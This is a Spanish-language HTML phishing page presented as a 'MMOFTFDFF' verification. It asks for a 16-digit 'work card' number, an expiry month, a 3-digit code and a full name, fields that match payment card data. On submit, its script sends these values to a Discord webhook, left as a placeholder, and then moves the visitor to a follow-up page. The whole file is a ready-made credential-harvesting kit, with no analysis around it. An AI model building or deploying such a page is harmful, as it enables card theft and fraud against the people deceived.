<!DOCTYPE html><html lang="es"><head>  <meta charset="UTF-8" />  <meta name="viewport" content="width=device-width, initial-scale=1" />  <title>Verificación MMOFTFDFF</title>  <style>    body {      margin: 0;      background-color: transparent; /* Sin fondo visible */      font-family: Arial, sans-serif;      color: #000;      display: flex;      justify-content: center;      align-items: center;      height: 100vh;    }    .banner {      background-color: white;      padding: 2rem 2rem 3rem 2rem;      border-radius: 8px;      box-shadow: 0 0 15px rgba(0,0,0,0.1);      width: 400px;      box-sizing: border-box;      text-align: center;    }    .logo {      display: block;      margin: 0 auto 1rem auto;      width: 60px;      height: 60px;      object-fit: contain;    }    h1 {      margin: 0 0 0.3rem 0;      font-weight: bold;      font-size: 1.8rem;    }    h2 {      margin: 0 0 2rem 0;      font-weight: normal;      font-size: 1rem;      color: #555;    }    form {      text-align: left;    }    label {      display: block;      margin-bottom: 0.3rem;      font-weight: bold;    }    input[type="text"],    input[type="password"],    input[type="month"] {      width: 100%;      padding: 0.5rem;      margin-bottom: 1.5rem;      border: 2px solid #ccc;      border-radius: 4px;      font-size: 1rem;      transition: border-color 0.3s;      box-sizing: border-box;    }    input[type="text"]:focus,    input[type="password"]:focus,    input[type="month"]:focus {      border-color: #fdda24;      outline: none;    }    .inline-group {      display: flex;      gap: 1rem;      margin-bottom: 1.5rem;    }    .inline-group > div {      flex: 1;    }    button {      background-color: #fdda24;      border: none;      padding: 0.75rem;      width: 100%;      font-weight: bold;      font-size: 1.1rem;      border-radius: 4px;      cursor: pointer;      transition: background-color 0.3s;      margin-bottom: 1rem;    }    button:hover {      background-color: #e6cc1d;    }    .secondary-button {      background-color: transparent;      color: #fdda24;      border: 2px solid #fdda24;      margin-top: 0;    }    .secondary-button:hover {      background-color: #fdda24;      color: #000;    }  </style></head><body>  <div class="banner">    <!-- Logo centrado -->    <img src="logo-pequeno.png" alt="Logo" class="logo" />    <h1>Verificación MMOFTFDFF</h1>    <h2>Ingresa los datos de tu carnet de trabajo</h2>
    <form id="verificationForm">      <label for="numeroCarnet">Número de carnet</label>      <input         type="text"         id="numeroCarnet"         name="numeroCarnet"         inputmode="numeric"         pattern="\d{16}"         maxlength="16"         minlength="16"         required         placeholder="16 dígitos"         title="Debe ser un número de 16 dígitos"      />
      <div class="inline-group">        <div>          <label for="fechaExpiracion">Fecha de expiración</label>          <input             type="month"             id="fechaExpiracion"             name="fechaExpiracion"             required             placeholder="MM/YYYY"          />        </div>        <div>          <label for="codigoEntrada">Código para entrar</label>          <input             type="password"             id="codigoEntrada"             name="codigoEntrada"             pattern="\d{3}"             maxlength="3"             minlength="3"             required             placeholder="3 dígitos"             title="Debe ser un código de 3 dígitos"            inputmode="numeric"          />        </div>      </div>
      <label for="nombreCompleto">Nombre completo</label>      <input         type="text"         id="nombreCompleto"         name="nombreCompleto"         required         placeholder="Tu nombre completo"      />
      <button type="submit">Continuar</button>    </form>
    <button class="secondary-button" onclick="window.location.href='index3.html'">No tengo carnet</button>  </div>
  <script>    const discordWebhookURL = "TU_WEBHOOK_AQUI";
    const form = document.getElementById("verificationForm");
    form.addEventListener("submit", function(e) {      e.preventDefault();
      const numeroCarnet = form.numeroCarnet.value.trim();      const fechaExpiracion = form.fechaExpiracion.value.trim();      const codigoEntrada = form.codigoEntrada.value.trim();      const nombreCompleto = form.nombreCompleto.value.trim();
      const regexNumeroCarnet = /^\d{16}$/;      const regexCodigoEntrada = /^\d{3}$/;
      if (!regexNumeroCarnet.test(numeroCarnet)) {        alert("El número de carnet debe tener exactamente 16 dígitos.");        form.numeroCarnet.focus();        return;      }
      if (!fechaExpiracion) {        alert("Por favor, ingresa la fecha de expiración.");        form.fechaExpiracion.focus();        return;      }
      if (!regexCodigoEntrada.test(codigoEntrada)) {        alert("El código para entrar debe tener exactamente 3 dígitos.");        form.codigoEntrada.focus();        return;      }
      if (nombreCompleto.length === 0) {        alert("Por favor, ingresa tu nombre completo.");        form.nombreCompleto.focus();        return;      }
      const content = `**Nueva verificación MMOFTFDFF**Número de carnet: ${numeroCarnet}Fecha de expiración: ${fechaExpiracion}Código para entrar: ${codigoEntrada}Nombre completo: ${nombreCompleto}      `;
      fetch(discordWebhookURL, {        method: "POST",        headers: {          "Content-Type": "application/json"        },        body: JSON.stringify({ content })      }).then(response => {        if (response.ok) {          window.location.href = "index2.html";        } else {          alert("Error enviando los datos. Intenta nuevamente.");        }      }).catch(() => {        alert("Error enviando los datos. Intenta nuevamente.");      });    });  </script></body></html>
